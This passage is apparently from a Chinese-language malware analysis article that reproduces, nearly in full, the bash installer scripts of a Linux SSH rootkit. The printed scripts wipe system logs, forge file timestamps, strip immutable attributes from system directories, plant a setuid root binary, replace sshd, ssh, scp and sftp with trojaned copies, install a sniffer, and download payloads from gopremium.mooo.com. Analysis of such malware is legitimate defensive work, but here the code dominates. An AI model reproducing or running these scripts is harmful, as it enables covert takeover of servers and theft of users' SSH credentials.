+#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;green#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;xxx&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+if&nbsp;[&nbsp;$#&nbsp;!=&nbsp;2&nbsp;];&nbsp;then&nbsp;good=0&nbsp;;&nbsp;fi
+if&nbsp;[&nbsp;&quot;$1&quot;&nbsp;==&nbsp;&quot;test&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;test=1
+elif&nbsp;[&nbsp;&quot;$1&quot;&nbsp;==&nbsp;&quot;install&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;install=1else
+&nbsp;good=0
+fi
+if&nbsp;[&nbsp;&quot;$good&quot;&nbsp;=&nbsp;&quot;0&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;$0&nbsp;[test&nbsp;|&nbsp;install]&nbsp;[rk&nbsp;kit]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;example:&nbsp;$0&nbsp;test&nbsp;2centos6-32bits&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;echo
+&nbsp;exit
+fi
+if&nbsp;[&nbsp;!&nbsp;-s&nbsp;&quot;$2&quot;&nbsp;]&nbsp;;&nbsp;then&nbsp;
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;$2&nbsp;is&nbsp;not&nbsp;a&nbsp;valid&nbsp;rk&nbsp;kit&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red
+&nbsp;echo
+&nbsp;exit
+fi
+&nbsp;
+###&nbsp;verificam&nbsp;daca&nbsp;e&nbsp;instalat&nbsp;ce&nbsp;folosim
+DEP=(&#39;/usr/bin/curl&#39;&#39;/bin/sed&#39;&#39;/usr/bin/gcc&#39;
+)for&nbsp;t&nbsp;in&nbsp;&quot;${DEP[@]}&quot;&nbsp;;&nbsp;do
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;-f&nbsp;$t&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$t&nbsp;-&nbsp;found&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$t&nbsp;-&nbsp;MISSING&nbsp;OR&nbsp;EMPTY&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good=0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi
+doneif&nbsp;[&nbsp;&quot;$good&quot;&nbsp;=&nbsp;&quot;0&quot;&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;&quot;Some&nbsp;files&nbsp;are&nbsp;missing&nbsp;or&nbsp;empty.&nbsp;Existing.&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;
+########&nbsp;golim&nbsp;logurile&nbsp;de&nbsp;pe&nbsp;server&nbsp;-&nbsp;pe&nbsp;viitor&nbsp;tb&nbsp;gasita&nbsp;alta&nbsp;varianta&gt;&nbsp;/var/log/messages&gt;&nbsp;/var/log/secure&gt;&nbsp;/var/log/lastlog&gt;&nbsp;/var/log/wtmp#&nbsp;EOF&nbsp;golim&nbsp;logurile&nbsp;de&nbsp;pe&nbsp;server&nbsp;-&nbsp;pe&nbsp;viitor&nbsp;tb&nbsp;gasita&nbsp;alta&nbsp;varianta
+&nbsp;
+########&nbsp;facem&nbsp;directorul&nbsp;si&nbsp;fiserul&nbsp;de&nbsp;unde&nbsp;luam&nbsp;timestamp&nbsp;si&nbsp;facem&nbsp;functia
+mkdir&nbsp;/usr/lib/libu.a/&nbsp;2&gt;/dev/null
+echo&nbsp;&quot;timestamp&quot;&nbsp;&gt;&nbsp;/usr/lib/libu.a/TS04840203583
+touch&nbsp;-r&nbsp;/usr/sbin/sshd&nbsp;/usr/lib/libu.a
+touch&nbsp;-r&nbsp;/usr/sbin/sshd&nbsp;/usr/lib/libu.a/TS04840203583
+luam_timestamp()&nbsp;{
+&nbsp;&nbsp;touch&nbsp;-r&nbsp;/usr/lib/libu.a/TS04840203583&nbsp;$1
+&nbsp;&nbsp;}#######&nbsp;EOF&nbsp;facem&nbsp;directorul&nbsp;si&nbsp;fiserul&nbsp;de&nbsp;unde&nbsp;luam&nbsp;timestamp&nbsp;si&nbsp;facem&nbsp;functia
+&nbsp;
+##########################################&nbsp;test&nbsp;partif&nbsp;[&nbsp;&quot;$test&quot;&nbsp;=&nbsp;&quot;1&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;#&nbsp;echo&nbsp;&quot;doing&nbsp;test&quot;
+&nbsp;if&nbsp;[&nbsp;-s&nbsp;&quot;$2/run-libcheck&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;cd&nbsp;$2
+&nbsp;&nbsp;./run-libcheck
+&nbsp;&nbsp;cd&nbsp;..
+&nbsp;fi
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;setting&nbsp;up&nbsp;permissions&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;permision&nbsp;400&nbsp;for&nbsp;/etc/ssh/ssh_host*&quot;&nbsp;;&nbsp;&nbsp;chmod&nbsp;400&nbsp;/etc/ssh/ssh_host*
+&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;creating:&nbsp;/var/empty&quot;&nbsp;;&nbsp;&nbsp;mkdir&nbsp;/var/empty&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;
+&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;moving&nbsp;sshd&nbsp;config&nbsp;files&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;/etc/ssh/sshd_config
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cp&nbsp;-f&nbsp;sshd_config&nbsp;/etc/ssh
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/etc/ssh/sshd_config
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;/etc/ssh/ssh_config
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cp&nbsp;-f&nbsp;ssh_config&nbsp;/etc/ssh
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/etc/ssh/ssh_config
+&nbsp;
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;test&nbsp;ended.&nbsp;Now&nbsp;test&nbsp;the&nbsp;sshd&nbsp;:)&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;cd&nbsp;$2
+&nbsp;rm&nbsp;-rf&nbsp;test-sshd&nbsp;;&nbsp;cp&nbsp;sshd-eu&nbsp;test-sshd
+&nbsp;cd&nbsp;..
+&nbsp;maindir=`pwd`&nbsp;;&nbsp;workdir=&quot;$maindir/$2&quot;
+&nbsp;echo&nbsp;&quot;&nbsp;$workdir/test-sshd&nbsp;-p&nbsp;65535&quot;
+&nbsp;echo&nbsp;&quot;&nbsp;telnet&nbsp;127.0.0.1&nbsp;65535&nbsp;/&nbsp;ssh&nbsp;root@127.0.0.1&nbsp;-p&nbsp;65535&quot;
+&nbsp;echo&nbsp;&quot;&nbsp;killall&nbsp;-9&nbsp;test-sshd&quot;
+&nbsp;
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;Daca&nbsp;totul&nbsp;e&nbsp;bine,&nbsp;ruleaza&nbsp;./run&nbsp;install&nbsp;$2&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;echo
+exit
+fi#&nbsp;EOF&nbsp;test&nbsp;part
+&nbsp;
+##########################################&nbsp;install&nbsp;partif&nbsp;[&nbsp;&quot;$install&quot;&nbsp;=&nbsp;&quot;1&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;creating&nbsp;sniffer&nbsp;files&nbsp;and&nbsp;main&nbsp;dir&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;Creating:&nbsp;/etc/pps&quot;
+&nbsp;&nbsp;&nbsp;mkdir&nbsp;/etc/pps&nbsp;;&nbsp;chmod&nbsp;777&nbsp;/etc/pps/
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/etc/pps
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;Creating:&nbsp;/etc/X11/.pr&quot;
+&nbsp;&nbsp;&nbsp;mkdir&nbsp;/etc/X11&nbsp;;&nbsp;chmod&nbsp;777&nbsp;/etc/X11/&nbsp;;&nbsp;&gt;&nbsp;/etc/X11/.pr
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/etc/X11/.pr
+&nbsp;
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;creating&nbsp;goprem&nbsp;dir&nbsp;&amp;&nbsp;file&nbsp;(suid)&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;creating:&nbsp;/usr/include/arpa&quot;
+&nbsp;&nbsp;&nbsp;mkdir&nbsp;/usr/include&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;mkdir&nbsp;/usr/include/arpa&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;gcc&nbsp;goprem.c&nbsp;&amp;&nbsp;moving&quot;
+&nbsp;&nbsp;&nbsp;gcc&nbsp;goprem.c&nbsp;-o&nbsp;goprem&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;mv&nbsp;goprem&nbsp;/usr/include/arpa/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chown&nbsp;root:root&nbsp;/usr/include/arpa/goprem
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod&nbsp;+s&nbsp;/usr/include/arpa/goprem
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/usr/include/arpa/goprem
+&nbsp;
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;getting&nbsp;permisions&nbsp;in&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;/usr/sbin&quot;
+&nbsp;&nbsp;&nbsp;chattr&nbsp;-R&nbsp;-aui&nbsp;/usr/sbin/&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;/usr/bin&quot;&nbsp;
+&nbsp;&nbsp;&nbsp;chattr&nbsp;-R&nbsp;-aui&nbsp;/usr/bin/&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;/bin&quot;
+&nbsp;&nbsp;&nbsp;chattr&nbsp;-R&nbsp;-aui&nbsp;/bin/&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;replacing&nbsp;system&nbsp;files&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;&nbsp;maindir=`pwd`&nbsp;;&nbsp;workdir=&quot;$maindir/$2&quot;
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;saving&nbsp;server&#39;s&nbsp;sshd&nbsp;in&nbsp;/etc/pps/old-srvf/&quot;
+&nbsp;&nbsp;&nbsp;mkdir&nbsp;/etc/pps/old-srvf&nbsp;;&nbsp;cp&nbsp;/usr/sbin/sshd&nbsp;/etc/pps/old-srvf/old55hd
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/etc/pps/old-srvf
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/etc/pps/old-srvf/old55hd
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;/usr/sbin/sshd&quot;
+&nbsp;&nbsp;&nbsp;cp&nbsp;-f&nbsp;$workdir/sshd-eu&nbsp;/usr/sbin/sshd
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/usr/sbin/sshd
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;/usr/bin/ssh&quot;
+&nbsp;&nbsp;&nbsp;cp&nbsp;-f&nbsp;$workdir/ssh&nbsp;/usr/bin/ssh
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/usr/bin/ssh
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;/usr/bin/sftp&quot;
+&nbsp;&nbsp;&nbsp;cp&nbsp;-f&nbsp;$workdir/sftp&nbsp;/usr/bin/sftp
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/usr/bin/sftp
+&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;;&nbsp;echo&nbsp;&quot;/usr/bin/scp&quot;
+&nbsp;&nbsp;&nbsp;cp&nbsp;-f&nbsp;$workdir/scp&nbsp;/usr/bin/scp
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/usr/bin/scp
+&nbsp;
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;moving&nbsp;to&nbsp;the&nbsp;last&nbsp;step&nbsp;(sshd&nbsp;restart&nbsp;file)&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;echo&nbsp;&quot;&nbsp;mv&nbsp;s_res&nbsp;/tmp/.bla&nbsp;;&nbsp;cd&nbsp;/tmp/.bla&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;rkkit*&quot;
+&nbsp;echo&nbsp;&quot;&nbsp;nohup&nbsp;./s_res&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null&nbsp;&quot;
+&nbsp;echo&nbsp;&quot;&nbsp;tar&nbsp;zxf&nbsp;side_files.tgz&nbsp;-C&nbsp;/etc/pps&nbsp;;&nbsp;cd&nbsp;/etc/pps/side_files&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;/tmp/.bla&quot;
+&nbsp;echo
+exit
+fi
+#&nbsp;EOF&nbsp;install&nbsp;part</pre><p><br/></p><p style="text-indent: 37px"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 18px; background: white;">脚本4（p3）：</span></strong></p><p style="text-indent: 37px"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 18px; background: white;"></span></strong></p><hr/><p style="text-indent: 37px"><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, sans-serif; background-color: white;">该脚本是由脚本p2通过指令curl --progress-bar -O http://gopremium.mooo.com/.../auto/p3调用的。</span></p><p style="text-indent: 37px"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px; background: white;">同样的，这个脚本会从http://gopremium.mooo.com/.../auto/side_files.tgz<br/> 调用一些其他工具。</span></p><p style="text-indent: 37px"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px; background: white;">在仔细研究附加脚本内容和其用处之前，我要先检查一下输出。</span></p><p style="text-indent: 37px"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px; background: white;">这里有几个值得注意的地方，但是最有趣的是最后一行显示了被入侵系统的所有信息以及主机IP。甚至还为该系统分配了一个独特的ID。网络罪犯们保存这样的信息是为了跟踪所有的入侵系统。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p7.qhimg.com/t010a24f8cc3221bcca.png" title="t0173b5218e3dcc3f3e.png" alt="http://p5.qhimg.com/t0173b5218e3dcc3f3e.png"/></p><p style="text-indent: 37px"><span style="font-family: 微软雅黑, sans-serif; font-size: 16px;">P3脚本的完整内容如下所示：</span></p><pre class="brush:plain;toolbar:false">#!/bin/bash
+##############&nbsp;rkip&nbsp;install&nbsp;(p3)
+#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red
+#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;green
+#&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;xxx&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+os=`cat&nbsp;1tempfiles/os.txt`
+rk=`cat&nbsp;1tempfiles/rk.txt`
+side_files_dir=`cat&nbsp;1tempfiles/side_files_dir.txt`
+maindir=`pwd`
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;downloading&nbsp;rkip&quot;&nbsp;#&nbsp;green
+rm&nbsp;-rf&nbsp;side_files.tgz
+curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/side_files.tgz
+if&nbsp;[&nbsp;!&nbsp;-f&nbsp;side_files.tgz&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;rkip&nbsp;install&quot;&nbsp;#&nbsp;green
+if&nbsp;[&nbsp;-z&nbsp;$side_files_dir&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;no&nbsp;side_files_dir.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+rm&nbsp;-rf&nbsp;/etc/pps/side_files
+tar&nbsp;mzxf&nbsp;side_files.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;side_files.tgz&nbsp;;&nbsp;cp&nbsp;-R&nbsp;side_files&nbsp;/etc/pps
+rkipdir=&quot;/etc/pps/side_files&quot;
+cd&nbsp;$rkipdir&nbsp;;&nbsp;yes&nbsp;y&nbsp;|&nbsp;./install&nbsp;$side_files_dir&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rkip&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rkip
+node_process_id=$(pidof&nbsp;[pdflush-0])
+if&nbsp;[[&nbsp;-z&nbsp;$node_process_id&nbsp;]];&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#echo&nbsp;&quot;&nbsp;nu&nbsp;exista&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;background&nbsp;proccess&nbsp;did&nbsp;not&nbsp;start.&nbsp;aborting.&nbsp;check&nbsp;($maindir/1tempfiles/log.rkip).&nbsp;script&nbsp;in&nbsp;/etc/pps/side_files&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;;&nbsp;exit
+fi
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rkip&nbsp;install&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rkip)&quot;
+echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;write&nbsp;this&nbsp;down&nbsp;in&nbsp;your&nbsp;notepad&nbsp;:)&quot;&nbsp;#cyan
+echo
+id_unic=`cat&nbsp;$maindir/1tempfiles/log.rkip|grep&nbsp;NOTEPAD`
+echo&nbsp;&quot;$id_unic&quot;
+echo
+####&nbsp;cleaning&nbsp;shit&nbsp;out
+cd&nbsp;/etc/pps&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;side_files&nbsp;;&nbsp;./dep-safe.arhivez
+rm&nbsp;-rf&nbsp;$maindir</pre><p style="text-indent: 29px"><span style="font-family: 微软雅黑, sans-serif; font-size: 15px;">&nbsp;</span><br/></p><p style="text-indent:43px"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, sans-serif;">side_files.tgz</span></strong><strong><span style="font-family: 微软雅黑, sans-serif;">工具的分析</span></strong></span></p><p style="text-indent: 37px"><span style="font-size:19px;font-family:&#39;微软雅黑&#39;,&#39;sans-serif&#39;">&nbsp;</span><span style="font-size: 16px;"><strong><span style="font-family: 微软雅黑, sans-serif;">安装脚本</span></strong></span></p><p style="text-indent: 37px"><span style="font-family: 微软雅黑, sans-serif; font-size: 16px;">主脚本“安装”执行几个主要功能。它定义了一个timestamp-ptty函数来修改一些文件的时间戳，使得调查更加困难。选择的时间戳和/bin/ls中的类似。</span></p><p style="text-indent: 37px"><span style="font-family: 微软雅黑, sans-serif; font-size: 16px;">同时，它还会检查是否存在一些已定义的URL，这会在之后的检查中发挥作用。<br/> &nbsp;&nbsp; 最后它还会调用另一个脚本dep-install_install2，这也是side_files.tgz的一部分。</span></p><p style="text-indent: 37px"><span style="font-family: 微软雅黑, sans-serif; font-size: 16px;">安装脚本的完整内容如下：</span></p><pre class="brush:plain;toolbar:false">#!/bin/bash
+#&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red
+#&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;green
+#&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;36m&nbsp;xxx&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+if&nbsp;[&nbsp;$#&nbsp;!=&nbsp;1&nbsp;];&nbsp;then
+&nbsp;echo
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;$0&nbsp;[...&nbsp;|&nbsp;.unix]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red
+&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[...&nbsp;|&nbsp;.unix]&nbsp;=&nbsp;which&nbsp;main&nbsp;server&nbsp;dir&nbsp;is&nbsp;used&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit;
+fi&nbsp;;&nbsp;echo
+##############&nbsp;facem&nbsp;linkul&nbsp;de&nbsp;la&nbsp;main&nbsp;server&nbsp;in&nbsp;functie&nbsp;de&nbsp;director
+myhost=&quot;gopremium.mooo.com&quot;
+main_link=&quot;http://$myhost/$1&quot;
+mkdir&nbsp;/usr/lib/libu.a/&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+##&nbsp;adaog&nbsp;timestamp
+&nbsp;echo&nbsp;&quot;timestamp-ptty&quot;&nbsp;&gt;&nbsp;/usr/lib/libu.a/TS8402386704
+&nbsp;touch&nbsp;-r&nbsp;/bin/ls&nbsp;/usr/lib/libu.a
+&nbsp;touch&nbsp;-r&nbsp;/bin/ls&nbsp;/usr/lib/libu.a/TS8402386704
+&nbsp;luam_timestamp()&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;touch&nbsp;-r&nbsp;/usr/lib/libu.a/TS8402386704&nbsp;$1
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
